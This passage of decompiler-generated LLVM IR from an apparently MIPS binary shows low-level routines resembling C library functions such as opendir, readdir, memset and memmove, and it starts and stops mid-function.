  %v2_405488 = inttoptr i32 %v1_405488 to i32*
  %v3_405488 = load i32, i32* %v2_405488, align 4
  %v3_40548c = load i32, i32* @global_var_449b14.129, align 4
  store i32 %v3_40548c, i32* @t9, align 4
  %v2_405494 = call i32 @function_4064b0(i32 %v3_405488)
  %v3_4054a4 = load i32, i32* @global_var_449b14.129, align 4
  store i32 %v3_4054a4, i32* @t9, align 4
  %v1_4054ac = load i32, i32* @s1, align 4
  %v3_4054ac = call i32 @function_4064b0(i32 %v1_4054ac)
  %v3_4054bc = load i32, i32* @global_var_449a88.202, align 4
  store i32 %v3_4054bc, i32* @t9, align 4
  %v1_4054c4 = load i32, i32* @s0, align 4
  %v3_4054c4 = call i32 @function_404de0(i32 %v1_4054c4)
  store i32 %v0_4053f0, i32* %s0.global-to-local, align 4
  ret i32 %v3_4054c4

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 9, { 2, 5, 3, 4, 6, 7, 1, 8, 0 }
  uselistorder label %dec_label_pc_405444, { 1, 0 }
}

define i32 @function_405500() local_unnamed_addr {
dec_label_pc_405500:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %v3_405524 = load i32, i32* @global_var_449a84.195, align 4
  store i32 %v3_405524, i32* @t9, align 4
  store i32 65664, i32* @a1, align 4
  %v5_40552c = call i32 @function_405070(i8* inttoptr (i32 65664 to i8*))
  %v1_405538 = icmp sgt i32 %v5_40552c, -1
  store i32 %v5_40552c, i32* @s0, align 4
  br i1 %v1_405538, label %dec_label_pc_405548, label %dec_label_pc_40553c

dec_label_pc_40553c:                              ; preds = %dec_label_pc_405500
  br label %dec_label_pc_405548

dec_label_pc_405548:                              ; preds = %dec_label_pc_405500, %dec_label_pc_40553c
  %v3_405548 = load i32, i32* @global_var_449b7c.203, align 4
  store i32 %v3_405548, i32* @t9, align 4
  %v3_405550 = ptrtoint i32* %stack_var_-168 to i32
  %v6_405550 = call i32 @function_4074f0(i32 %v5_40552c, i32 %v3_405550)
  %v1_40555c = icmp slt i32 %v6_405550, 0
  %v2_40555c = load i32, i32* @s0, align 4
  store i32 %v2_40555c, i32* @a0, align 4
  br i1 %v1_40555c, label %dec_label_pc_405580, label %dec_label_pc_405560

dec_label_pc_405560:                              ; preds = %dec_label_pc_405548
  %v3_405564 = load i32, i32* @global_var_449a8c.204, align 4
  store i32 %v3_405564, i32* @t9, align 4
  store i32 2, i32* @a1, align 4
  %v1_40556c = call i32 @function_404c80()
  %v1_405578 = icmp sgt i32 %v1_40556c, -1
  br i1 %v1_405578, label %dec_label_pc_4055b4, label %dec_label_pc_405580

dec_label_pc_405580:                              ; preds = %dec_label_pc_405560, %dec_label_pc_405548
  %v3_405580 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_405580, i32* @t9, align 4
  %v1_405588 = call i32 @function_4057a0()
  %v0_405594 = load i32, i32* @s0, align 4
  %v3_405598 = load i32, i32* @global_var_449a88.202, align 4
  store i32 %v3_405598, i32* @t9, align 4
  %v1_40559c = inttoptr i32 %v1_405588 to i32*
  %v2_40559c = load i32, i32* %v1_40559c, align 4
  store i32 %v2_40559c, i32* @s0, align 4
  store i32 %v1_405588, i32* @s1, align 4
  %v3_4055a0 = call i32 @function_404de0(i32 %v0_405594)
  %v0_4055b0 = load i32, i32* @s0, align 4
  %v1_4055b0 = load i32, i32* @s1, align 4
  %v2_4055b0 = inttoptr i32 %v1_4055b0 to i32*
  store i32 %v0_4055b0, i32* %v2_4055b0, align 4
  br label %dec_label_pc_4055b4

dec_label_pc_4055b4:                              ; preds = %dec_label_pc_405560, %dec_label_pc_405580
  %v3_4055b4 = load i32, i32* @global_var_449cb8.14, align 4
  store i32 %v3_4055b4, i32* @t9, align 4
  %v2_4055bc = call i32 @function_406200(i32 48)
  %v1_4055c8 = icmp eq i32 %v2_4055bc, 0
  store i32 %v2_4055bc, i32* @s2, align 4
  br i1 %v1_4055c8, label %dec_label_pc_405630, label %dec_label_pc_4055cc

dec_label_pc_4055cc:                              ; preds = %dec_label_pc_4055b4
  %v0_4055d0 = load i32, i32* @s0, align 4
  %v2_4055d0 = inttoptr i32 %v2_4055bc to i32*
  store i32 %v0_4055d0, i32* %v2_4055d0, align 4
  %v1_4055d4 = add i32 %v2_4055bc, 16
  %v2_4055d4 = inttoptr i32 %v1_4055d4 to i32*
  store i32 0, i32* %v2_4055d4, align 4
  %v1_4055d8 = add i32 %v2_4055bc, 8
  %v2_4055d8 = inttoptr i32 %v1_4055d8 to i32*
  store i32 0, i32* %v2_4055d8, align 4
  %v1_4055dc = add i32 %v2_4055bc, 4
  %v2_4055dc = inttoptr i32 %v1_4055dc to i32*
  store i32 0, i32* %v2_4055dc, align 4
  store i32 %tmp, i32* @v0, align 4
  %v1_4055e8 = icmp ult i32 %tmp, 512
  %v1_4055ec = icmp eq i1 %v1_4055e8, false
  %v3_4055ec = load i32, i32* @s2, align 4
  %v4_4055ec = add i32 %v3_4055ec, 20
  %v5_4055ec = inttoptr i32 %v4_4055ec to i32*
  store i32 %tmp, i32* %v5_4055ec, align 4
  br i1 %v1_4055ec, label %dec_label_pc_4055fc, label %dec_label_pc_4055f0

dec_label_pc_4055f0:                              ; preds = %dec_label_pc_4055cc
  store i32 512, i32* @v0, align 4
  %v1_4055f8 = load i32, i32* @s2, align 4
  %v2_4055f8 = add i32 %v1_4055f8, 20
  %v3_4055f8 = inttoptr i32 %v2_4055f8 to i32*
  store i32 512, i32* %v3_4055f8, align 4
  br label %dec_label_pc_4055fc

dec_label_pc_4055fc:                              ; preds = %dec_label_pc_4055cc, %dec_label_pc_4055f0
  %v3_4055fc = load i32, i32* @global_var_449c5c.121, align 4
  store i32 %v3_4055fc, i32* @t9, align 4
  %v0_405600 = load i32, i32* @s2, align 4
  %v1_405600 = add i32 %v0_405600, 20
  %v2_405600 = inttoptr i32 %v1_405600 to i32*
  %v3_405600 = load i32, i32* %v2_405600, align 4
  %v4_405604 = call i32 @function_4063f0(i64 1, i32 %v3_405600)
  %v1_405610 = icmp eq i32 %v4_405604, 0
  %v3_405610 = load i32, i32* @s2, align 4
  %v4_405610 = add i32 %v3_405610, 12
  %v5_405610 = inttoptr i32 %v4_405610 to i32*
  store i32 %v4_405604, i32* %v5_405610, align 4
  br i1 %v1_405610, label %dec_label_pc_405614, label %dec_label_pc_405668

dec_label_pc_405614:                              ; preds = %dec_label_pc_4055fc
  %v3_405618 = load i32, i32* @global_var_449b14.129, align 4
  store i32 %v3_405618, i32* @t9, align 4
  %v1_405620 = load i32, i32* @s2, align 4
  %v3_405620 = call i32 @function_4064b0(i32 %v1_405620)
  br label %dec_label_pc_405630

dec_label_pc_405630:                              ; preds = %dec_label_pc_4055b4, %dec_label_pc_405614
  %v3_405630 = load i32, i32* @global_var_449a88.202, align 4
  store i32 %v3_405630, i32* @t9, align 4
  %v1_405638 = load i32, i32* @s0, align 4
  %v3_405638 = call i32 @function_404de0(i32 %v1_405638)
  %v3_405648 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_405648, i32* @t9, align 4
  store i32 0, i32* @s2, align 4
  %v1_405650 = call i32 @function_4057a0()
  %v2_405664 = inttoptr i32 %v1_405650 to i32*
  store i32 12, i32* %v2_405664, align 4
  br label %dec_label_pc_405668

dec_label_pc_405668:                              ; preds = %dec_label_pc_4055fc, %dec_label_pc_405630
  %v0_40566c = load i32, i32* @s2, align 4
  %v1_40566c = add i32 %v0_40566c, 24
  %v2_405670 = call i32 @function_406e64(i32 %v1_40566c)
  %v0_40567c = load i32, i32* @s2, align 4
  ret i32 %v0_40567c

; uselistorder directives
  uselistorder i32 %v2_4055bc, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v1_405588, { 1, 0 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_4064b0, { 3, 2, 1, 0 }
  uselistorder i32 (i64, i32)* @function_4063f0, { 0, 4, 1, 2, 3 }
  uselistorder i64 1, { 1, 2, 0 }
  uselistorder i32 (i32)* @function_406200, { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @function_404de0, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_405668, { 1, 0 }
  uselistorder label %dec_label_pc_405630, { 1, 0 }
  uselistorder label %dec_label_pc_4055fc, { 1, 0 }
  uselistorder label %dec_label_pc_4055b4, { 1, 0 }
  uselistorder label %dec_label_pc_405548, { 1, 0 }
}

define i32 @function_4056a0(i32* %arg1) local_unnamed_addr {
dec_label_pc_4056a0:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v1_4056c4 = add i32 %tmp, 24
  store i32 %v1_4056c4, i32* @s0, align 4
  store i32 %tmp, i32* @s1, align 4
  %v3_4056d4 = ptrtoint i32* %stack_var_-32 to i32
  %v6_4056d4 = call i32 @function_406e6c(i32 %v3_4056d4, i32 ptrtoint (i32* @global_var_406e64.199 to i32))
  %v1_4056ec = load i32, i32* @s0, align 4
  %v3_4056ec = call i32 @function_406e64(i32 %v1_4056ec)
  br label %dec_label_pc_4056f8

dec_label_pc_4056f8:                              ; preds = %dec_label_pc_405738, %dec_label_pc_4056a0
  %v0_4056f8 = load i32, i32* @s1, align 4
  %v1_4056f8 = add i32 %v0_4056f8, 4
  %v2_4056f8 = inttoptr i32 %v1_4056f8 to i32*
  %v3_4056f8 = load i32, i32* %v2_4056f8, align 4
  %v1_4056fc = add i32 %v0_4056f8, 8
  %v2_4056fc = inttoptr i32 %v1_4056fc to i32*
  %v3_4056fc = load i32, i32* %v2_4056fc, align 4
  %v3_405700 = load i32, i32* @global_var_449cfc.206, align 4
  store i32 %v3_405700, i32* @t9, align 4
  %v2_405704 = icmp ult i32 %v3_4056f8, %v3_4056fc
  br i1 %v2_405704, label %dec_label_pc_405738, label %dec_label_pc_40570c

dec_label_pc_40570c:                              ; preds = %dec_label_pc_4056f8
  %v1_405710 = inttoptr i32 %v0_4056f8 to i32*
  %v2_405710 = load i32, i32* %v1_405710, align 4
  store i32 %v2_405710, i32* @a0, align 4
  %v1_405714 = add i32 %v0_4056f8, 12
  %v2_405714 = inttoptr i32 %v1_405714 to i32*
  %v3_405714 = load i32, i32* %v2_405714, align 4
  %v1_405718 = add i32 %v0_4056f8, 20
  %v2_405718 = inttoptr i32 %v1_405718 to i32*
  %v3_405718 = load i32, i32* %v2_405718, align 4
  store i32 %v3_405718, i32* @a2, align 4
  %v4_40571c = call i32 @function_407580(i32 %v2_405710, i32 %v3_405714, i32 %v3_405718)
  store i32 %v4_40571c, i32* @v0, align 4
  %v1_405728 = icmp slt i32 %v4_40571c, 1
  store i32 0, i32* @s0, align 4
  br i1 %v1_405728, label %dec_label_pc_405774, label %dec_label_pc_40572c

dec_label_pc_40572c:                              ; preds = %dec_label_pc_40570c
  %v1_405730 = load i32, i32* @s1, align 4
  %v2_405730 = add i32 %v1_405730, 8
  %v3_405730 = inttoptr i32 %v2_405730 to i32*
  store i32 %v4_40571c, i32* %v3_405730, align 4
  %v0_405734 = load i32, i32* @s1, align 4
  %v1_405734 = add i32 %v0_405734, 4
  %v2_405734 = inttoptr i32 %v1_405734 to i32*
  store i32 0, i32* %v2_405734, align 4
  %v0_405738.pre = load i32, i32* @s1, align 4
  br label %dec_label_pc_405738

dec_label_pc_405738:                              ; preds = %dec_label_pc_4056f8, %dec_label_pc_40572c
  %v1_405754 = phi i32 [ %v0_4056f8, %dec_label_pc_4056f8 ], [ %v0_405738.pre, %dec_label_pc_40572c ]
  %v1_405738 = add i32 %v1_405754, 4
  %v2_405738 = inttoptr i32 %v1_405738 to i32*
  %v3_405738 = load i32, i32* %v2_405738, align 4
  %v1_40573c = add i32 %v1_405754, 12
  %v2_40573c = inttoptr i32 %v1_40573c to i32*
  %v3_40573c = load i32, i32* %v2_40573c, align 4
  %v2_405744 = add i32 %v3_40573c, %v3_405738
  store i32 %v2_405744, i32* @s0, align 4
  %v1_405748 = add i32 %v2_405744, 8
  %v2_405748 = inttoptr i32 %v1_405748 to i16*
  %v3_405748 = load i16, i16* %v2_405748, align 2
  %v4_405748 = zext i16 %v3_405748 to i32
  %v2_405750 = add i32 %v4_405748, %v3_405738
  store i32 %v2_405750, i32* %v2_405738, align 4
  %v0_405758 = load i32, i32* @s0, align 4
  %v1_405758 = add i32 %v0_405758, 4
  %v2_405758 = inttoptr i32 %v1_405758 to i32*
  %v3_405758 = load i32, i32* %v2_405758, align 4
  %v1_405760 = load i32, i32* @s1, align 4
  %v2_405760 = add i32 %v1_405760, 16
  %v3_405760 = inttoptr i32 %v2_405760 to i32*
  store i32 %v3_405758, i32* %v3_405760, align 4
  %v0_405764 = load i32, i32* @s0, align 4
  %v1_405764 = inttoptr i32 %v0_405764 to i32*
  %v2_405764 = load i32, i32* %v1_405764, align 4
  store i32 %v2_405764, i32* @v0, align 4
  %v1_40576c = icmp eq i32 %v2_405764, 0
  br i1 %v1_40576c, label %dec_label_pc_4056f8, label %dec_label_pc_405774

dec_label_pc_405774:                              ; preds = %dec_label_pc_405738, %dec_label_pc_40570c
  %v3_40577c = call i32 @function_406e6c(i32 %v3_4056d4, i32 1)
  %v0_405784 = load i32, i32* @s0, align 4
  ret i32 %v0_405784

; uselistorder directives
  uselistorder i32 %v1_405754, { 1, 0 }
  uselistorder i32 %v0_4056f8, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_405738, { 1, 0 }
}

define i32 @function_4057a0() local_unnamed_addr {
dec_label_pc_4057a0:
  %v3_4057ac = load i32, i32* bitcast (i32** @global_var_449b38.208 to i32*), align 4
  ret i32 %v3_4057ac
}

define i32 @function_4057c0() local_unnamed_addr {
dec_label_pc_4057c0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v3_4057d8 = load i32, i32* @global_var_449c30.209, align 4
  store i32 %v3_4057d8, i32* @t9, align 4
  %v5_4057e0 = bitcast i32* %stack_var_-24 to %tms*
  %v6_4057e0 = call i32 @function_407c00(%tms* %v5_4057e0)
  %v3_4057ec = load i32, i32* %stack_var_-24, align 4
  %v2_4057f4 = add i32 %v3_4057ec, %tmp
  %v1_405814 = mul i32 %v2_4057f4, 10000
  %v2_405820 = and i32 %v1_405814, 2147483632
  ret i32 %v2_405820

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_405830(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405830:
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %a2.global-to-local, align 4
  store i32 %arg2, i32* @a1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @a0, align 4
  %v1_405830 = icmp slt i32 %arg3, 8
  br i1 %v1_405830, label %dec_label_pc_4058a4, label %dec_label_pc_405838

dec_label_pc_405838:                              ; preds = %dec_label_pc_405830
  %v1_40583c = icmp eq i32 %arg2, 0
  %v3_40583c = urem i32 %arg2, 256
  br i1 %v1_40583c, label %dec_label_pc_405854, label %dec_label_pc_405840

dec_label_pc_405840:                              ; preds = %dec_label_pc_405838
  %v1_405844 = mul nuw nsw i32 %v3_40583c, 256
  %v2_405848 = or i32 %v1_405844, %v3_40583c
  %v1_40584c = mul i32 %v2_405848, 65536
  %v2_405850 = or i32 %v1_40584c, %v2_405848
  br label %dec_label_pc_405854

dec_label_pc_405854:                              ; preds = %dec_label_pc_405838, %dec_label_pc_405840
  %storemerge = phi i32 [ %v2_405850, %dec_label_pc_405840 ], [ %v3_40583c, %dec_label_pc_405838 ]
  %v0_4058844 = phi i32 [ %v2_405850, %dec_label_pc_405840 ], [ %v3_40583c, %dec_label_pc_405838 ]
  store i32 %storemerge, i32* @a1, align 4
  %v1_405854 = sub i32 0, %tmp
  %v1_405858 = urem i32 %v1_405854, 4
  %v1_40585c = icmp eq i32 %v1_405858, 0
  %v4_40585c = sub i32 %arg3, %v1_405858
  store i32 %v4_40585c, i32* %a2.global-to-local, align 4
  br i1 %v1_40585c, label %dec_label_pc_40586c, label %dec_label_pc_405860

dec_label_pc_405860:                              ; preds = %dec_label_pc_405854
  %v2_405868 = add i32 %v1_405858, %tmp
  store i32 %v2_405868, i32* @a0, align 4
  br label %dec_label_pc_40586c

dec_label_pc_40586c:                              ; preds = %dec_label_pc_405854, %dec_label_pc_405860
  %v1_405878 = phi i32 [ %tmp, %dec_label_pc_405854 ], [ %v2_405868, %dec_label_pc_405860 ]
  %v1_40586c = urem i32 %v4_40585c, 8
  %v2_405870 = icmp eq i32 %v4_40585c, %v1_40586c
  %v5_405870 = sub i32 %v4_40585c, %v1_40586c
  store i32 %v5_405870, i32* %a3.global-to-local, align 4
  br i1 %v2_405870, label %dec_label_pc_405890, label %dec_label_pc_405874

dec_label_pc_405874:                              ; preds = %dec_label_pc_40586c
  %v2_405878 = add i32 %v1_405878, %v5_405870
  store i32 %v2_405878, i32* %a3.global-to-local, align 4
  store i32 %v1_40586c, i32* %a2.global-to-local, align 4
  %v1_40588016 = add i32 %v1_405878, 8
  store i32 %v1_40588016, i32* @a0, align 4
  %v3_40588417 = inttoptr i32 %v1_405878 to i32*
  store i32 %v0_4058844, i32* %v3_40588417, align 4
  %v0_40588818 = load i32, i32* @a0, align 4
  %v1_40588819 = load i32, i32* %a3.global-to-local, align 4
  %v2_40588820 = icmp eq i32 %v0_40588818, %v1_40588819
  %v3_40588821 = load i32, i32* @a1, align 4
  %v5_40588822 = add i32 %v0_40588818, -4
  %v6_40588823 = inttoptr i32 %v5_40588822 to i32*
  store i32 %v3_40588821, i32* %v6_40588823, align 4
  br i1 %v2_40588820, label %dec_label_pc_405890.loopexit, label %dec_label_pc_405880.dec_label_pc_405880_crit_edge

dec_label_pc_405880.dec_label_pc_405880_crit_edge: ; preds = %dec_label_pc_405874, %dec_label_pc_405880.dec_label_pc_405880_crit_edge
  %v0_405880.pre = load i32, i32* @a0, align 4
  %v0_405884.pre = load i32, i32* @a1, align 4
  %v1_405880 = add i32 %v0_405880.pre, 8
  store i32 %v1_405880, i32* @a0, align 4
  %v3_405884 = inttoptr i32 %v0_405880.pre to i32*
  store i32 %v0_405884.pre, i32* %v3_405884, align 4
  %v0_405888 = load i32, i32* @a0, align 4
  %v1_405888 = load i32, i32* %a3.global-to-local, align 4
  %v2_405888 = icmp eq i32 %v0_405888, %v1_405888
  %v3_405888 = load i32, i32* @a1, align 4
  %v5_405888 = add i32 %v0_405888, -4
  %v6_405888 = inttoptr i32 %v5_405888 to i32*
  store i32 %v3_405888, i32* %v6_405888, align 4
  br i1 %v2_405888, label %dec_label_pc_405890.loopexit, label %dec_label_pc_405880.dec_label_pc_405880_crit_edge

dec_label_pc_405890.loopexit:                     ; preds = %dec_label_pc_405880.dec_label_pc_405880_crit_edge, %dec_label_pc_405874
  %v0_405890.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_405890

dec_label_pc_405890:                              ; preds = %dec_label_pc_405890.loopexit, %dec_label_pc_40586c
  %v0_405890 = phi i32 [ %v0_405890.pre, %dec_label_pc_405890.loopexit ], [ %v4_40585c, %dec_label_pc_40586c ]
  %v1_405890 = and i32 %v0_405890, 4
  %v1_405894 = icmp eq i32 %v1_405890, 0
  %v4_405894 = sub i32 %v0_405890, %v1_405890
  store i32 %v4_405894, i32* %a2.global-to-local, align 4
  br i1 %v1_405894, label %dec_label_pc_405890.dec_label_pc_4058a4_crit_edge, label %dec_label_pc_405898

dec_label_pc_405890.dec_label_pc_4058a4_crit_edge: ; preds = %dec_label_pc_405890
  %v3_4058a4.pre = load i32, i32* @a0, align 4
  br label %dec_label_pc_4058a4

dec_label_pc_405898:                              ; preds = %dec_label_pc_405890
  %v0_40589c = load i32, i32* @a1, align 4
  %v1_40589c = load i32, i32* @a0, align 4
  %v2_40589c = inttoptr i32 %v1_40589c to i32*
  store i32 %v0_40589c, i32* %v2_40589c, align 4
  %v0_4058a0 = load i32, i32* @a0, align 4
  %v1_4058a0 = add i32 %v0_4058a0, 4
  store i32 %v1_4058a0, i32* @a0, align 4
  %v0_4058a4.pr.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_4058a4

dec_label_pc_4058a4:                              ; preds = %dec_label_pc_405830, %dec_label_pc_405898, %dec_label_pc_405890.dec_label_pc_4058a4_crit_edge
  %v3_4058a4 = phi i32 [ %v3_4058a4.pre, %dec_label_pc_405890.dec_label_pc_4058a4_crit_edge ], [ %v1_4058a0, %dec_label_pc_405898 ], [ %tmp, %dec_label_pc_405830 ]
  %v0_4058a4 = phi i32 [ %v4_405894, %dec_label_pc_405890.dec_label_pc_4058a4_crit_edge ], [ %v0_4058a4.pr.pre, %dec_label_pc_405898 ], [ %arg3, %dec_label_pc_405830 ]
  %v1_4058a4 = icmp slt i32 %v0_4058a4, 1
  %v4_4058a4 = add i32 %v0_4058a4, %v3_4058a4
  store i32 %v4_4058a4, i32* @a3, align 4
  br i1 %v1_4058a4, label %dec_label_pc_4058b8, label %dec_label_pc_4058ac.preheader

dec_label_pc_4058ac.preheader:                    ; preds = %dec_label_pc_4058a4
  %v1_4058ac11 = add i32 %v3_4058a4, 1
  store i32 %v1_4058ac11, i32* @a0, align 4
  %v2_4058b012 = icmp eq i32 %v1_4058ac11, %v4_4058a4
  %v3_4058b013 = load i32, i32* @a1, align 4
  %v4_4058b014 = trunc i32 %v3_4058b013 to i8
  %v7_4058b015 = inttoptr i32 %v3_4058a4 to i8*
  store i8 %v4_4058b014, i8* %v7_4058b015, align 1
  br i1 %v2_4058b012, label %dec_label_pc_4058b8, label %dec_label_pc_4058ac.dec_label_pc_4058ac_crit_edge

dec_label_pc_4058ac.dec_label_pc_4058ac_crit_edge: ; preds = %dec_label_pc_4058ac.preheader, %dec_label_pc_4058ac.dec_label_pc_4058ac_crit_edge
  %v0_4058ac.pre = load i32, i32* @a0, align 4
  %v1_4058b0.pre = load i32, i32* @a3, align 4
  %v1_4058ac = add i32 %v0_4058ac.pre, 1
  store i32 %v1_4058ac, i32* @a0, align 4
  %v2_4058b0 = icmp eq i32 %v1_4058ac, %v1_4058b0.pre
  %v3_4058b0 = load i32, i32* @a1, align 4
  %v4_4058b0 = trunc i32 %v3_4058b0 to i8
  %v7_4058b0 = inttoptr i32 %v0_4058ac.pre to i8*
  store i8 %v4_4058b0, i8* %v7_4058b0, align 1
  br i1 %v2_4058b0, label %dec_label_pc_4058b8, label %dec_label_pc_4058ac.dec_label_pc_4058ac_crit_edge

dec_label_pc_4058b8:                              ; preds = %dec_label_pc_4058ac.preheader, %dec_label_pc_4058ac.dec_label_pc_4058ac_crit_edge, %dec_label_pc_4058a4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_405890, { 1, 0 }
  uselistorder i32 %v1_40586c, { 2, 0, 1 }
  uselistorder i32 %v4_40585c, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_405858, { 2, 1, 0 }
  uselistorder i32 %v2_405848, { 1, 0 }
  uselistorder i32 %v3_40583c, { 0, 1, 3, 2 }
  uselistorder i32 %tmp, { 4, 1, 2, 0, 3, 5 }
  uselistorder i32* %a3.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %a2.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_4058b8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_4058ac.dec_label_pc_4058ac_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_4058a4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_405880.dec_label_pc_405880_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_40586c, { 1, 0 }
  uselistorder label %dec_label_pc_405854, { 1, 0 }
}

define i32 @function_4058c0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4058c0:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %t1.global-to-local = alloca i32, align 4
  %t2.global-to-local = alloca i32, align 4
  %t3.global-to-local = alloca i32, align 4
  %t4.global-to-local = alloca i32, align 4
  %t5.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @a2, align 4
  store i32 %arg2, i32* @a1, align 4
  store i32 %arg1, i32* @a0, align 4
  %v1_4058c8 = load i32, i32* @t9, align 4
  %v2_4058c8 = add i32 %v1_4058c8, 311712
  store i32 %v2_4058c8, i32* %gp.global-to-local, align 4
  %v2_4058dc = sub i32 %arg1, %arg2
  %v2_4058e0 = icmp ult i32 %v2_4058dc, %arg3
  %v3_4058e0 = zext i1 %v2_4058e0 to i32
  store i32 %v3_4058e0, i32* %v0.global-to-local, align 4
  store i32 %arg1, i32* %s0.global-to-local, align 4
  store i32 %arg3, i32* %v1.global-to-local, align 4
  br i1 %v2_4058e0, label %dec_label_pc_40590c, label %dec_label_pc_4058ec

dec_label_pc_4058ec:                              ; preds = %dec_label_pc_4058c0
  store i32 ptrtoint (i32* @global_var_407ea0.211 to i32), i32* @t9, align 4
  %v1_4058f8 = call i32 @function_407ea0()
  store i32 %v2_4058c8, i32* %gp.global-to-local, align 4
  %v0_405908 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_405908, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_40590c

dec_label_pc_40590c:                              ; preds = %dec_label_pc_4058c0, %dec_label_pc_4058ec
  %v1_40590c = icmp ult i32 %arg3, 16
  %v2_40590c = zext i1 %v1_40590c to i32
  store i32 %v2_40590c, i32* %v0.global-to-local, align 4
  %v2_405910 = add i32 %arg3, %arg2
  store i32 %v2_405910, i32* %a1.global-to-local, align 4
  %v4_405914 = add i32 %arg3, %arg1
  store i32 %v4_405914, i32* %t2.global-to-local, align 4
  br i1 %v1_40590c, label %dec_label_pc_40590c.dec_label_pc_405bb8_crit_edge, label %dec_label_pc_405918

dec_label_pc_40590c.dec_label_pc_405bb8_crit_edge: ; preds = %dec_label_pc_40590c
  %v0_405bbc.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_405bb8

dec_label_pc_405918:                              ; preds = %dec_label_pc_40590c
  %v1_40591c = urem i32 %v4_405914, 4
  store i32 %v1_40591c, i32* %v0.global-to-local, align 4
  %v2_405920 = sub i32 %arg3, %v1_40591c
  store i32 %v2_405920, i32* %a2.global-to-local, align 4
  store i32 %v1_40591c, i32* %v1.global-to-local, align 4
  %v1_40592c33 = add i32 %v2_405910, -1
  store i32 %v1_40592c33, i32* %a1.global-to-local, align 4
  %v1_40593034 = inttoptr i32 %v1_40592c33 to i8*
  %v2_40593035 = load i8, i8* %v1_40593034, align 1
  %v3_40593036 = zext i8 %v2_40593035 to i32
  store i32 %v3_40593036, i32* %v0.global-to-local, align 4
  %v1_40593437 = add i32 %v4_405914, -1
  store i32 %v1_40593437, i32* %t2.global-to-local, align 4
  %v3_40593838 = inttoptr i32 %v1_40593437 to i8*
  store i8 %v2_40593035, i8* %v3_40593838, align 1
  %v0_40593c39 = load i32, i32* %v1.global-to-local, align 4
  %v1_40593c40 = icmp eq i32 %v0_40593c39, 0
  %v3_40593c41 = add i32 %v0_40593c39, -1
  store i32 %v3_40593c41, i32* %v1.global-to-local, align 4
  %v0_40594442 = load i32, i32* %a1.global-to-local, align 4
  br i1 %v1_40593c40, label %dec_label_pc_405940, label %dec_label_pc_40592c.dec_label_pc_40592c_crit_edge

dec_label_pc_40592c.dec_label_pc_40592c_crit_edge: ; preds = %dec_label_pc_405918, %dec_label_pc_40592c.dec_label_pc_40592c_crit_edge
  %v0_40594443 = phi i32 [ %v0_405944, %dec_label_pc_40592c.dec_label_pc_40592c_crit_edge ], [ %v0_40594442, %dec_label_pc_405918 ]
  %v0_405934.pre = load i32, i32* %t2.global-to-local, align 4
  %v1_40592c = add i32 %v0_40594443, -1
  store i32 %v1_40592c, i32* %a1.global-to-local, align 4
  %v1_405930 = inttoptr i32 %v1_40592c to i8*
  %v2_405930 = load i8, i8* %v1_405930, align 1
  %v3_405930 = zext i8 %v2_405930 to i32
  store i32 %v3_405930, i32* %v0.global-to-local, align 4
  %v1_405934 = add i32 %v0_405934.pre, -1
  store i32 %v1_405934, i32* %t2.global-to-local, align 4
  %v3_405938 = inttoptr i32 %v1_405934 to i8*
  store i8 %v2_405930, i8* %v3_405938, align 1
  %v0_40593c = load i32, i32* %v1.global-to-local, align 4
  %v1_40593c = icmp eq i32 %v0_40593c, 0
  %v3_40593c = add i32 %v0_40593c, -1
  store i32 %v3_40593c, i32* %v1.global-to-local, align 4
  %v0_405944 = load i32, i32* %a1.global-to-local, align 4
  br i1 %v1_40593c, label %dec_label_pc_405940, label %dec_label_pc_40592c.dec_label_pc_40592c_crit_edge

dec_label_pc_405940:                              ; preds = %dec_label_pc_40592c.dec_label_pc_40592c_crit_edge, %dec_label_pc_405918
  %v0_405944.lcssa = phi i32 [ %v0_40594442, %dec_label_pc_405918 ], [ %v0_405944, %dec_label_pc_40592c.dec_label_pc_40592c_crit_edge ]
  %v1_405944 = urem i32 %v0_405944.lcssa, 4
  store i32 %v1_405944, i32* %v0.global-to-local, align 4
  %v1_405948 = icmp eq i32 %v1_405944, 0
  %v2_405948 = load i32, i32* %a2.global-to-local, align 4
  %v3_405948 = udiv i32 %v2_405948, 4
